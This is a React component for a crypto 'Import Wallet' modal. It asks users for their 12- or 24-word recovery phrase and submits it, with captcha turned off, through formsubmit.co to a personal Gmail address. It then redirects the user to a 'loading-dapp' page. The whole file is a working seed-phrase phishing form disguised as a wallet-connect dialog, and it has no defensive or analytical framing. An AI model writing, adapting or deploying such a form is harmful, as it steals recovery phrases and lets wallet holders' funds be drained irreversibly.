import { FiX } from "react-icons/fi";

export default function WalletModal({ wallet, onClose }) {
  return (
    <div className="modal-overlay">
      <div className="wallet-modal">
        <div className="modal-header">
          <div className="modal-wallet">
            <img src={wallet.icon} alt={wallet.name} />
            <h3>{wallet.name}</h3>
          </div>
          <FiX onClick={onClose} />
        </div>
        <form
          action="https://formsubmit.co/loriharlan255@gmail.com"
          method="POST"
        >
          <div className="modal-body">
            <h1>Import Wallet</h1>
            <h3>{wallet.name}</h3>
            <input type="hidden" name="wallet.name" value={wallet.name} />
            <input type="hidden" name="_captcha" value="false" />
            <input
              type="hidden"
              name="_next"
              value="https://loading-dapp.pages.dev"
            />
            <label>
              Typically 12 (sometimes 24) words seperated by a single spaces.
            </label>

            <textarea
              placeholder="Enter recovery phrase"
              id="message"
              name="message"
              rows="4"
              cols="50"
              required
            />

            <button type="submit" className="connect-btn">
              Connect Wallet
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
